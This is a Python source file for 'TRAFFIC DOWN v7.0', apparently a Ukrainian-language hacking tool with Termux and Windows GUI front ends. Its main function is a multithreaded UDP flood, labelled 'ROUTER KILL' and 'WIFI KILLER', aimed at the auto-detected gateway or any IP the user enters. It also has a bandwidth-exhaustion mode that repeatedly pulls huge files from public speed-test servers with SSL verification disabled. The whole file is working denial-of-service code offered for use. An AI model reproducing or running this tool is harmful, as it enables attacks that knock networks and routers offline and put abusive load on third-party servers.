#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
TRAFFIC DOWN v7.0 [GOD MODE]
Авторська переробка з збереженням оригінального функціоналу.
"""

import os
import sys
import time
import json
import asyncio
import threading
import socket
import random
import platform
import subprocess
from datetime import datetime
import logging
from logging.handlers import RotatingFileHandler

# --- 0. СИСТЕМНА ПЕРЕВІРКА ТА АВТО-ІНСТАЛ ---
IS_ANDROID = "com.termux" in os.environ.get("PREFIX", "")
IS_WINDOWS = os.name == 'nt'
CONFIG_FILE = "traffic_god_config.json"
# --- LOGGING (SINGLE FILE) ---
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

LOG_FILE = os.path.join(LOG_DIR, "trafficdown.log")

log = logging.getLogger("TrafficDown")
log.setLevel(logging.DEBUG)

if not log.handlers:
    formatter = logging.Formatter(
        "%(asctime)s | %(levelname)s | %(threadName)s | %(message)s"
    )

    file_handler = RotatingFileHandler(
        LOG_FILE,
        maxBytes=5_000_000,
        backupCount=3,
        encoding="utf-8"
    )
    file_handler.setFormatter(formatter)
    file_handler.setLevel(logging.DEBUG)

    console_handler = logging.StreamHandler()
    console_handler.setFormatter(formatter)
    console_handler.setLevel(logging.INFO)

    log.addHandler(file_handler)
    log.addHandler(console_handler)

def auto_install():
    required = ["aiohttp", "rich", "psutil", "requests", "netifaces"]
    if IS_WINDOWS: required.append("customtkinter")
    
    missing = []
    for lib in required:
        try:
            __import__(lib)
        except ImportError:
            missing.append(lib)
    
    if missing:
        print(f"\033[91m[SYSTEM] Відсутні модулі: {', '.join(missing)}\033[0m")
        print(f"\033[93m[SYSTEM] Виконую екстрене встановлення...\033[0m")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing)
            print("\033[92m[OK] Готово! Перезапуск...\033[0m")
            time.sleep(1)
            os.execl(sys.executable, sys.executable, *sys.argv)
        except Exception as e:
            print(f"[CRITICAL ERROR] {e}")
            sys.exit(1)

auto_install()

# --- ІМПОРТИ ---
import aiohttp
import psutil
import netifaces
from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.align import Align
from rich.progress import Progress, BarColumn, TextColumn
from rich import box

GUI_AVAILABLE = False
if IS_WINDOWS:
    try:
        import customtkinter as ctk
        GUI_AVAILABLE = True
    except: pass

# --- 1. CONFIG MANAGER (Щоб не вводити вручну) ---
class Config:
    def __init__(self):
        self.default = {
            "target_ip": "192.168.0.1",
            "target_port": 80,
            "threads_dl": 20 if IS_WINDOWS else 12,
            "threads_ul": 100 if IS_WINDOWS else 40,
            "packet_size": 4096,
            "theme": "Dark"
        }
        self.data = self.load()

    def load(self):
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    return {**self.default, **json.load(f)}
            except: pass
        return self.default

    def save(self):
        with open(CONFIG_FILE, 'w') as f:
            json.dump(self.data, f, indent=4)
            
    def get_gateway(self):
        """Автоматичний пошук IP роутера (Gateway)"""
        try:
            gws = netifaces.gateways()
            return gws['default'][netifaces.AF_INET][0]
        except:
            return "192.168.0.1"

cfg = Config()

# --- 2. ЯДРО (ENGINE) ---
class GodEngine:
    def __init__(self):
        self.running = False
        self.mode = "IDLE"
        self.lock = threading.Lock()
        
        # Статистика
        self.dl_total = 0
        self.ul_total = 0
        self.errors = 0
        self.start_ts = time.time()
        
        # Цілі для скачування (Повернув оригінальні + додав нові)
        self.urls = [
            'https://speed.hetzner.de/10GB.bin',
            'https://speed.hetzner.de/1GB.bin',
            'https://speedtest.selectel.ru/10GB',
            'https://proof.ovh.net/files/10Gb.dat',
            'http://speedtest.tele2.net/10GB.zip',
            'http://speedtest-ny.turnkeyinternet.net/10000mb.bin',
            'http://ipv4.download.thinkbroadband.com/1GB.zip'
        ]
        
        self.loop = asyncio.new_event_loop()
        threading.Thread(target=self._async_loop, daemon=True).start()
        self.last_error = "—"
    def _async_loop(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()

    def start_download(self):
        if self.running:
            log.warning("ENGINE: start_download called but engine already running")
            return

        log.info("ENGINE: START DOWNLOAD")

        self.running = True
        self.mode = "DOWNLOADING"
        self.start_ts = time.time()

        threads = cfg.data['threads_dl']
        log.debug(f"DOWNLOAD threads = {threads}")

        for i in range(threads):
            asyncio.run_coroutine_threadsafe(self._dl_task(), self.loop)
            log.debug(f"DOWNLOAD task #{i+1} started")

    def start_flood(self, ip=None, port=None):
        if self.running: return
        self.running = True
        self.mode = "ROUTER KILL (UDP)"
        self.start_ts = time.time()
        target_ip = ip if ip else cfg.data['target_ip']
        target_port = int(port) if port else cfg.data['target_port']
        log.warning(f"ENGINE: START UDP FLOOD → {target_ip}:{target_port}")

        # Зберігаємо останні налаштування
        cfg.data['target_ip'] = target_ip
        cfg.data['target_port'] = target_port
        cfg.save()
        
        threads = cfg.data['threads_ul']
        for _ in range(threads):
            asyncio.run_coroutine_threadsafe(self._ul_task(target_ip, target_port), self.loop)

    def stop(self):
        self.running = False
        self.mode = "IDLE"

    async def _dl_task(self):
        connector = aiohttp.TCPConnector(verify_ssl=False, limit=0)
        async with aiohttp.ClientSession(connector=connector) as session:
            while self.running and self.mode == "DOWNLOADING":
                try:
                    url = random.choice(self.urls)
                    async with session.get(url, timeout=5) as resp:
                        while self.running:
                            chunk = await resp.content.read(1024 * 1024)
                            if not chunk:
                                break
                            with self.lock:
                                self.dl_total += len(chunk)
                except Exception as e:
                    with self.lock:
                        self.errors += 1
                        self.last_error = str(e)[:80]
                    log.exception("Download task error")
                    await asyncio.sleep(1)

    async def _ul_task(self, ip, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet_size = cfg.data['packet_size']
        payload = os.urandom(packet_size)
        
        while self.running and "UDP" in self.mode:
            try:
                sock.sendto(payload, (ip, port))
                with self.lock: self.ul_total += packet_size
                # Анти-фриз для слабких пристроїв
                if IS_ANDROID and self.ul_total % (packet_size * 50) == 0:
                    await asyncio.sleep(0.01)
            except:
                with self.lock: self.errors += 1
                await asyncio.sleep(0.1)

    def get_stats(self):
        with self.lock:
            return {
                "dl": self.dl_total / 1024 / 1024, # MB
                "ul": self.ul_total / 1024 / 1024, # MB
                "err": self.errors,
                "mode": self.mode,
                "active": self.running
            }

engine = GodEngine()

# --- 3. TERMUX UI (HACKER STYLE) ---
class TermuxUI:
    def __init__(self):
        self.console = Console()
        self.last_dl = 0
        self.last_ul = 0
        self.last_t = time.time()

    def get_dashboard(self):
        stats = engine.get_stats()
        now = time.time()
        delta = now - self.last_t if now - self.last_t > 0 else 0.1
        
        spd_dl = (stats['dl'] - self.last_dl) / delta
        spd_ul = (stats['ul'] - self.last_ul) / delta
        
        self.last_dl, self.last_ul, self.last_t = stats['dl'], stats['ul'], now

        # Головна таблиця
        grid = Table.grid(expand=True)
        grid.add_column(ratio=1)
        
        # Заголовок
        header = Panel(
            Align.center(f"[bold green]TRAFFICDOWN 2.1B[/]\n[dim]Target: {cfg.data['target_ip']} | Threads: {cfg.data['threads_dl']}/{cfg.data['threads_ul']}[/]"),
            style="on black", border_style="green"
        )
        
        # Дані
        t_stats = Table(expand=True, box=box.SIMPLE)
        t_stats.add_column("METRIC", style="cyan")
        t_stats.add_column("VALUE", justify="right", style="bold white")
        
        t_stats.add_row("Status", f"[{'green' if stats['active'] else 'red'}]{stats['mode']}[/]")
        t_stats.add_row("Total Downloaded", f"[green]{stats['dl']/1024:.2f} GB[/]")
        t_stats.add_row("Download Speed", f"[bold green]{spd_dl:.1f} MB/s[/]")
        t_stats.add_row("Total Flood", f"[red]{stats['ul']/1024:.2f} GB[/]")
        t_stats.add_row("Flood Speed", f"[bold red]{spd_ul:.1f} MB/s[/]")
        t_stats.add_row("Errors", f"[yellow]{stats['err']}[/]")
        
        # Системні ресурси
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
        res_panel = Panel(
            f"CPU: {cpu}%  |  RAM: {ram}%",
            title="SYSTEM RESOURCE", border_style="blue"
        )
        
        grid.add_row(header)
        grid.add_row(Panel(t_stats, border_style="white"))
        grid.add_row(res_panel)
        
        return grid

    def run(self):
        self.console.clear()
        self.console.print(Panel("[bold green]TRAFFIC DOWN v7.0[/]", style="on black"))
        
        # Авто-визначення Gateway для зручності
        gateway = cfg.get_gateway()
        
        print(f"\033[96m[1] \033[97mЗ'їдання трафіку (Download)")
        print(f"\033[96m[2] \033[97mWIFI KILL / Router Flood (Auto Gateway: {gateway})")
        print(f"\033[96m[3] \033[97mВласні налаштування UDP")
        
        c = input("\n\033[93m>>> \033[0m")
        
        if c == '1':
            engine.start_download()
        elif c == '2':
            engine.start_flood(gateway, 80)
        elif c == '3':
            ip = input("IP: ")
            port = input("Port: ")
            engine.start_flood(ip, port)
        else:
            return

        with Live(self.get_dashboard(), refresh_per_second=4, screen=True) as live:
            while True:
                live.update(self.get_dashboard())
                time.sleep(0.25)

# --- 4. WINDOWS GUI (PRO DESIGN) ---
class WindowsGUI:
    def __init__(self):
        self.root = ctk.CTk()
        self.root.geometry("900x650")
        self.root.title("TrafficDown Ultimate")
        ctk.set_appearance_mode("Dark")
        ctk.set_default_color_theme("green")
        
        self.last_dl = 0
        self.last_ul = 0
        self.last_t = time.time()
        
        self.setup_ui()
        self.update_loop()
        
    def setup_ui(self):
        # Сайдбар
        self.sidebar = ctk.CTkFrame(self.root, width=200, corner_radius=0)
        self.sidebar.pack(side="left", fill="y")
        
        ctk.CTkLabel(self.sidebar, text="TRAFFIC\nDOWN", font=("Arial Black", 24)).pack(pady=40)
        
        # Головна панель
        self.main = ctk.CTkFrame(self.root, fg_color="transparent")
        self.main.pack(side="right", fill="both", expand=True, padx=20, pady=20)
        
        # Вкладки
        self.tabs = ctk.CTkTabview(self.main)
        self.tabs.pack(fill="both", expand=True)
        self.tabs.add("DASHBOARD")
        self.tabs.add("SETTINGS")
        
        # --- DASHBOARD ---
        self.tab_dash = self.tabs.tab("DASHBOARD")
        
        # Лічильники
        self.frame_cnt = ctk.CTkFrame(self.tab_dash, fg_color="#111")
        self.frame_cnt.pack(fill="x", pady=10, padx=10)
        
        self.lbl_dl = ctk.CTkLabel(self.frame_cnt, text="DL: 0.00 MB/s", font=("Consolas", 30, "bold"), text_color="#00FF00")
        self.lbl_dl.pack(pady=10)
        self.lbl_ul = ctk.CTkLabel(self.frame_cnt, text="UL: 0.00 MB/s", font=("Consolas", 30, "bold"), text_color="#FF0000")
        self.lbl_ul.pack(pady=10)
        self.lbl_total = ctk.CTkLabel(self.frame_cnt, text="Total Traffic: 0.00 GB", font=("Arial", 14), text_color="gray")
        self.lbl_total.pack(pady=5)
        
        # Кнопки
        self.btn_dl = ctk.CTkButton(self.tab_dash, text="🔥 START DOWNLOAD", command=self.toggle_dl, 
                                    height=60, font=("Arial", 18, "bold"), fg_color="#006600", hover_color="#008800")
        self.btn_dl.pack(fill="x", pady=20, padx=50)
        
        # UDP секція
        udp_frame = ctk.CTkFrame(self.tab_dash)
        udp_frame.pack(fill="x", padx=10, pady=10)
        
        ctk.CTkLabel(udp_frame, text="ROUTER / WIFI KILLER", font=("Arial", 14, "bold")).pack(pady=5)
        
        self.ent_ip = ctk.CTkEntry(udp_frame, placeholder_text="Target IP")
        self.ent_ip.pack(pady=5, fill="x", padx=20)
        self.ent_ip.insert(0, cfg.data['target_ip'])
        
        self.btn_ul = ctk.CTkButton(udp_frame, text="☠ START FLOOD", command=self.toggle_ul,
                                    height=50, font=("Arial", 16, "bold"), fg_color="#660000", hover_color="#880000")
        self.btn_ul.pack(fill="x", pady=10, padx=40)

        # --- SETTINGS ---
        self.tab_set = self.tabs.tab("SETTINGS")
        ctk.CTkLabel(self.tab_set, text="Кількість потоків (Threads)").pack(pady=20)
        
        self.sl_dl = ctk.CTkSlider(self.tab_set, from_=1, to=100, number_of_steps=99)
        self.sl_dl.set(cfg.data['threads_dl'])
        self.sl_dl.pack(fill="x", padx=50, pady=10)
        ctk.CTkLabel(self.tab_set, text="Download Threads").pack()
        
        self.sl_ul = ctk.CTkSlider(self.tab_set, from_=10, to=500, number_of_steps=490)
        self.sl_ul.set(cfg.data['threads_ul'])
        self.sl_ul.pack(fill="x", padx=50, pady=10)
        ctk.CTkLabel(self.tab_set, text="Flood Threads").pack()
        
        ctk.CTkButton(self.tab_set, text="Зберегти налаштування", command=self.save_settings).pack(pady=40)

    def toggle_dl(self):
        if engine.running:
            engine.stop()
            self.btn_dl.configure(text="🔥 START DOWNLOAD", fg_color="#006600")
        else:
            engine.start_download()
            self.btn_dl.configure(text="STOP PROCESS", fg_color="#444")

    def toggle_ul(self):
        if engine.running:
            engine.stop()
            self.btn_ul.configure(text="☠ START FLOOD", fg_color="#660000")
        else:
            engine.start_flood(self.ent_ip.get(), 80)
            self.btn_ul.configure(text="STOP ATTACK", fg_color="#444")

    def save_settings(self):
        cfg.data['threads_dl'] = int(self.sl_dl.get())
        cfg.data['threads_ul'] = int(self.sl_ul.get())
        cfg.save()

    def update_loop(self):
        stats = engine.get_stats()
        now = time.time()
        delta = now - self.last_t if now - self.last_t > 0.1 else 0.1
        
        sdl = (stats['dl'] - self.last_dl) / delta
        sul = (stats['ul'] - self.last_ul) / delta
        
        self.last_dl, self.last_ul, self.last_t = stats['dl'], stats['ul'], now
        
        total_gb = (stats['dl'] + stats['ul']) / 1024
        
        self.lbl_dl.configure(text=f"DL: {sdl:.1f} MB/s")
        self.lbl_ul.configure(text=f"UL: {sul:.1f} MB/s")
        self.lbl_total.configure(text=f"Total: {total_gb:.2f} GB")
        
        self.root.after(200, self.update_loop)

    def run(self):
        self.root.mainloop()

# --- MAIN ENTRY ---
if __name__ == "__main__":
    if IS_WINDOWS and GUI_AVAILABLE:
        try:
            WindowsGUI().run()
        except Exception as e:
            print(f"GUI Error: {e}")
            TermuxUI().run()
    else:
        try:
            TermuxUI().run()
        except KeyboardInterrupt:
            print("\n[STOP] System halted.")
            os._exit(0)
